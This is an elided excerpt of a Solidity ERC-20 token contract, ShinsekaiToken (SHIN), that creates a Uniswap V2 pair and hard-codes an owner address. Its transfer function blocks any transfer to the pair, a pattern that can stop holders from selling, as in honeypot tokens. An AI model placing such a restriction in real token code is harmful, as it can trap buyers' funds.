...
contract ShinsekaiToken is Context, IERC20, Ownable 
{
    ...
    string private _name = "SHINTOKEN";
    string private _symbol = "SHIN";
    uint8 private _decimals = 18;

    uint256 private _totalSupply = 77_000_000_000 * 10 ** _decimals;
    IUniswapV2Router01 public uniswapV2Router;
    address public uniswapV2Pair;

    constructor () {
        address uni = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router01 _uniswapV2Router = IUniswapV2Router01(uni);  
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        address newOwner = 0x1A195F0BC6021d52EBCBb7f0d786E84772E13e53;
    ...
    function _transfer(address from, address to, uint256 amount) private
    {
        ...
        require(to != uniswapV2Pair, "Can't add liquidity");
